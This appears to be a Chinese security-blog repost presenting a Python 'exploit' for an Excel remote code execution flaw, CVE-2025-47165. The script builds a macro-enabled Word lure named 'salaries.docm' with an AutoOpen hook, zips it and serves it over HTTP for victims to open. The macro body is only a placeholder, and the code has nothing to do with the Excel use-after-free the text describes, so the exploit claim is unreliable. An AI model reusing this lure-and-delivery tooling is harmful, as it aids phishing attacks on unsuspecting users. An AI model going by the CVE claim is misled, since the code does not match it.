> **原文链接**: https://mp.weixin.qq.com/s?__biz=MzI5MDE5NDcxMA==&mid=2650936285&idx=1&sn=60142e8edd54163d31016b75f65cdbdd

#  Microsoft Excel 2024 - 远程代码执行 (CVE-2025-47165)  
原创 匿名  安全微焦点   2025-06-27 03:09  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/kOxLp8Dkyyk0nmibN9DZrSoiaHBsmBwQxac7OnjTBbicX4ENJNH343fm2CL7vgf8ZyFb5Z6mrBPdJBnoLMgxj6Fxg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
攻击者可以通过电子邮件或流媒体服务器发送恶意 DOCM 文件，诱骗任何用户打开并执行其代码。  
  
Microsoft Office Excel 中的释放后使用漏洞允许未经授权的恶意用户在本地执行代码。  

```
#!/usr/bin/python


import os
import sys
import pythoncom
from win32com.client import Dispatch
import http.server
import socketserver
import socket
import threading
import zipfile


PORT = 8000
DOCM_FILENAME = &#34;salaries.docm&#34;
ZIP_FILENAME = &#34;salaries.zip&#34;
DIRECTORY = &#34;.&#34;


def create_docm_with_macro(filename=DOCM_FILENAME):
    pythoncom.CoInitialize()
    word = Dispatch(&#34;Word.Application&#34;)
    word.Visible = False


    try:
        doc = word.Documents.Add()
        vb_project = doc.VBProject
        vb_component = vb_project.VBComponents(&#34;ThisDocument&#34;)


        macro_code = '''
Sub AutoOpen()
      //YOUR EXPLOIT HERE
      // All OF YPU PLEASE WATCH THE DEMO VIDEO
      // Best Regards to packetstorm.news and OFFSEC
End Sub
'''


        vb_component.CodeModule.AddFromString(macro_code)


        doc.SaveAs(os.path.abspath(filename), FileFormat=13)
        print(f&#34;[+] Macro-enabled Word document created: {filename}&#34;)


    except Exception as e:
        print(f&#34;[!] Error creating document: {e}&#34;)
    finally:
        doc.Close(False)
        word.Quit()
        pythoncom.CoUninitialize()


def zip_docm(docm_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', compression=zipfile.ZIP_DEFLATED)
as zipf:
        zipf.write(docm_path, arcname=os.path.basename(docm_path))
    print(f&#34;[+] Created ZIP archive: {zip_path}&#34;)


def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect((&#34;8.8.8.8&#34;, 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = &#34;127.0.0.1&#34;
    finally:
        s.close()
    return ip


class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)


def run_server():
    ip = get_local_ip()
    print(f&#34;[+] Starting HTTP server on http://{ip}:{PORT}&#34;)
    print(f&#34;[+] Place your macro docm and zip files in this directory to
serve them.&#34;)
    print(f&#34;[+] Access the ZIP file at: http://{ip}:{PORT}/{ZIP_FILENAME}&#34;)
    with socketserver.TCPServer((&#34;&#34;, PORT), Handler) as httpd:
        print(&#34;[+] Server running, press Ctrl+C to stop&#34;)
        httpd.serve_forever()


if __name__ == &#34;__main__&#34;:
    if os.name != &#34;nt&#34;:
        print(&#34;[!] This script only runs on Windows with MS Word
installed.&#34;)
        sys.exit(1)


    print(&#34;[*] Creating the macro-enabled document...&#34;)
    create_docm_with_macro(DOCM_FILENAME)


    print(&#34;[*] Creating ZIP archive of the document...&#34;)
    zip_docm(DOCM_FILENAME, ZIP_FILENAME)


    print(&#34;[*] Starting HTTP server in background thread...&#34;)
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()


    try:
        while True:
            pass  # Keep main thread alive
    except KeyboardInterrupt:
        print(&#34;\n[!] Server stopped by user.&#34;)


```

  
  
